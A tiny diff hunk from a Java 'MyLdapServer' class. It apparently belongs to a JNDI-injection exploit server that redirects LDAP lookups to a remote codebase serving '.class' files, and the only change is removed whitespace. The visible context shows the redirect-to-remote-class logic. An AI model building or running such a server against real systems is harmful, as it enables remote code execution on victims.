@@ -73,7 +73,7 @@ public class MyLdapServer {
 
 			URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
 			System.out.println("[+] new LDAP request for " + base + " redirecting to " + turl);
-			
+
 			String cbstring = this.codebase.toString();
 			int refPos = cbstring.indexOf('#');
 			if ( refPos > 0 ) {
